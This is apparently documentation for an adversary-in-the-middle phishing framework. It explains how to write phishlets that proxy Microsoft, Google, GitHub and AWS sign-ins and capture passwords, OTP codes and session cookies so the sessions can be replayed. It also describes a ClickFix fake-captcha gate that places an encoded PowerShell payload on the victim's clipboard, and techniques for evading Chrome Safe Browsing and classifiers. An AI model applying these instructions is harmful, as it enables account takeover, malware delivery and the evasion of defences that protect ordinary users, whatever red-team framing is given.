---
layout: default
title: Phishlet authoring
---

# Phishlet authoring

A phishlet YAML declares one identity-provider flow: which hosts to proxy, which
sub-domains to fabricate, which requests carry credentials, and which cookies complete a
captured session. Campaign phishlets live **only on the node** — `src/phishlets/*.yaml` is
gitignored so the public repo never ships them.

Generate a skeleton: `tools/make_phishlet.py` (feature #6) or copy and adapt a working one.

---

## Core structure

```yaml
name: ms365
proxy_hosts:
  - hostname: {accounts.<BASE>.<ZONE>}     # fabricated host (phish_sub "accounts")
    phish_sub: accounts
    origin: https://login.microsoftonline.com
    is_landing: true                        # victims land here
  - hostname: {login.<BASE>.<ZONE>}
    phish_sub: login
    origin: https://login.live.com
    sub_filters:
      - {hostname: login.microsoftonline.com, sub: accounts, search: login.microsoftonline.com, replace: accounts.{hostname}}
credentials:
  username: {key: loginfmt, search: '...', type: post}      # capture rules
  password:  {key: passwd,  search: '...', type: post}
  custom:                                                            # MFA / extra fields
    - {key: otp, search: '(.*)', type: post}                         # typed TOTP/SMS codes
login:
  domain: login.microsoftonline.com
bg_ja4_allow:                       # optional: per-phishlet botguard JA4 exceptions
  - t13d1310c009130100              # (corporate TLS-inspection variants) — OR-merged
  - t13d1311c009130100              # with the node-level -bg-ja4 allowlist
proxy: true                         # optional: force this phishlet's whole upstream
                                    # through the node's exit proxy (residential) —
                                    # for Cloudflare-protected origins that reject
                                    # datacenter egress IPs (claude/gitlab/chatgpt/…)
auth_tokens:
  - domain: login.live.com
    keys: ['WLSSC', 'ESTSAUTHPERSISTENT']    # cookie-set that completes a session
```

### The three capture pillars

1. **credentials** — POST-body keys / regexes that hold the username & password.
2. **custom** — extra tokens worth logging (OTP codes, session claims).
3. **auth_tokens** — the cookie set that makes the session *reusable*. This is the
   difference between "we saw a password" and "we own the mailbox".
   Field-proven: ms365 needs `WLSSC` (consumer) / `ESTSAUTHPERSISTENT` (work);
   Google needs the `.google.com` `SID`/`__Secure-1PSID`/`SAPISID` family.

## Rules that prevent broken campaigns

- **`phish_sub` uniqueness across enabled phishlets.** Two phishlets on one base domain
  must never claim the same `phish_sub` — collisions cause random cross-redirects.
  Current layout: ms365 = `accounts`, `login`; google = `signin`, `gwww`.
- **`general.domain` must equal the base.** Changing only phishlet hostnames leaves a
  stale `general.domain`, which breaks sub-filter rendering (absolute URLs pointing at a
  dead domain abort the victim's JS mid-flow).
- **Search/replace both directions.** Every absolute URL the origin embeds must be
  rewritten to the fabricated host *and back* on the way out — test a full flow, not just
  the landing page.
- **Google's `f.req` username capture**: the email lives inside the JSON-RPC array, not a
  plain form field — capture by regex over the POST body.
- **`login.domain` must be an exact `orig_sub`+`domain` pair from `proxy_hosts`.** The
  loader validates it (aws lesson: `signin` + `amazon.com` combines to
  `signin.amazon.com`, but the real host is `signin.aws.amazon.com` — use domain
  `aws.amazon.com`).
- **Host-only cookies need a no-dot `auth_tokens` group.** `Set-Cookie` without a
  `Domain` attribute (every `__Host-*` cookie) lands on the bare hostname and the
  lookup is exact-string — a `.github.com` group never sees them. GitHub's session
  cookie is exactly that: `__Host-user_session_same_site` on `github.com`.
- **Verify the token list against a live login.** Providers change cookies silently —
  modern GitHub dropped domain-wide `user_session` entirely. Mark non-critical cookies
  `:opt` so completion cannot hang.
- **Proxy telemetry hosts, never block them** (`collector.github.com`,
  `play.google.com/log`, …): blocking looks like a broken client to the provider's
  risk engine (the Google "browser not secure" lesson).

## Per-phishlet botguard JA4 exceptions

`bg_ja4_allow` (optional list of JA4 prefixes, min 4 lowercase-alphanumeric chars)
whitelists TLS fingerprints for **this phishlet only** — OR-merged with the
node-level `-bg-ja4` flag list. Use it when a corporate SWG (Umbrella, Palo Alto)
re-terminates TLS so victims arrive with the appliance's fingerprint instead of
Chrome's: read the variant from `journalctl` (`JA4 not in allowlist`) and add it
here — hot-reload applies immediately, no service restart, no unit edit.
A match logs `JA4 allowed by phishlet exception (<phishlet>)` for visibility.

## ClickFix gate (fake captcha + clipboard payload)

Optional per-phishlet section that serves a social-engineering "fake captcha"
page which silently copies a command to the victim's clipboard and instructs
them to run it (Win+R → Ctrl+V → Enter):

```yaml
clickfix:
  template: cloudflare-turnstile     # template file (clickfix/templates/<name>.html)
  command: "powershell ..."          # payload copied to clipboard (base64-encoded in page source)
  position: before                   # "before" = pre-login gate, "after" = post-capture
  only: false                        # true = clickfix-only mode (no login flow)
  subdomain: login.example.com       # display domain override (if the template shows one)
```

**Position `before`**: the victim sees the fake captcha at the lure URL,
ticks the checkbox (clipboard is poisoned), follows the Win+R / Ctrl+V /
Enter instructions, clicks Verify (enables after a random delay), then gets
forwarded to the phishing login.

**Position `after`**: the victim enters credentials (captured normally),
then sees a "one more step" captcha instead of the expected redirect, runs
the command, then gets sent to the real site.

**`only: true`**: pure payload delivery — the gate is served before any
session exists and the victim is redirected to the lure's `redirect_url`
afterwards. No credential flow runs.

Every template shares the same wrapped clipboard command, ending in
`;'I am not a robot - reCAPTCHA Verification ID: XXXX'` — the 4-digit ID is
generated server-side per request and displayed on the page, so what the
victim sees in the Run dialog matches the page (real-campaign replica).

**Templates** are self-contained HTML in `clickfix/templates/` — gitignored,
deployed to the node alongside phishlets. Placeholders: `{command_b64}`
(base64-encoded payload — preferred), `{command}` (legacy cleartext),
`{redirect_url}` (post-verify target, substituted in both positions).

Built-in styles: `cloudflare-turnstile`, `windows-fix`, `recaptcha`.

### Detection hardening (built into all templates)

The templates follow the same CSD doctrine as the phishing pages:

- **Zero sensitive content at load**: all instruction text ("Win+R",
  "Ctrl+V", "Verify you are human") is base64-encoded in the source and
  injected into the DOM only after the state machine advances — the
  load-time DOM snapshot contains no phishing keywords for classifiers.
- **Brand lazy-reveal**: logo/domain hidden behind `visibility:hidden`
  until the first pointermove/keydown/touchstart gesture (same pattern
  as the ms365 CSD v2 hardening).
- **Base64 payload**: the command is never in cleartext in the page
  source — decoded at runtime via `atob()`.
- **Randomized fingerprint**: variable timing, random verification IDs,
  dynamic text injection order — no byte-identical page across loads.
- **Inline SVG favicon** (brand-matched) + generic title +
  `robots: noindex,nofollow`.
- **`Cache-Control: no-cache, no-store`** on every response.

## Token-gated lures## Token-gated lures

Lures carry an automatic token; the phishlet's landing host checks `?t=` before creating a
session. Without a valid token the victim gets a 302 to the benign `redirect_url` —
crawlers, Safe Browsing and chat-link previews classify a benign page, dramatically
extending domain life. Keep `redirect_url` plausible (e.g. the real product marketing
page) and never reuse the same token across campaigns.

## CSD hardening (Chrome Safe Browsing client-side detection)

Chrome's client-side phishing detection screenshots the page and classifies it in-browser —
protections must survive a screenshot. Two field-verified layers (in `js_inject`):

1. **Password DOM disguise** — swap `input[type=password]` to `type=text` with
   `-webkit-text-security:disc` plus a MutationObserver keeping it that way: the DOM no
   longer contains a password field, the visual stays identical.
2. **Brand lazy-reveal** — hide logo/brand assets behind an `eg-bg` style at load; remove
   it on the first real user gesture (`pointermove`/`keydown`/`touchstart`). The visual
   model can't classify a page whose brand never loads before interaction.

Doctrine: victims with Safe Browsing *on* are normal for a red-team engagement — the
password host may still get flagged after N interactions, so plan capture-before-flag and
burn-and-rotate by waves; never rotate hosts mid-victim (cookies are host-scoped).
Detection checks belong on burner domains, never the campaign one.

## Testing a phishlet

1. `enable <phishlet>` + fresh lure with token.
2. Render **through the lure with `?t=<token>`** in one browser session. Never visit
   the landing path directly: a direct visit has no session, so POSTs are not
   monitored (capture silently missing), and a non-allowlisted headless JA4 gets
   the botguard decoy redirect — which looks exactly like a broken phishlet.
   The token-gate param is `t`, not `token`.
3. Walk the whole flow with a test account: identifier → password → MFA → landed app.
   Push-type MFA (GitHub Mobile) posts no OTP field — `custom: otp` only fires on
   typed codes; that is expected.
4. `sessions` shows the capture; `export <id>` and replay the cookies into a real browser.
5. Only then: detection checks from a burner, and the campaign. Pause test lures with
   `PUT /lures/{id}` `{"paused": <unix-ts>}` — the field is an int64 "pause until"
   timestamp, not a boolean (`0` resumes).

Cloudflare-protected logins (gitlab, claude, chatgpt) show the CF challenge **on the
phishing host** for headless browsers — verify with a real browser before declaring
the phishlet broken.
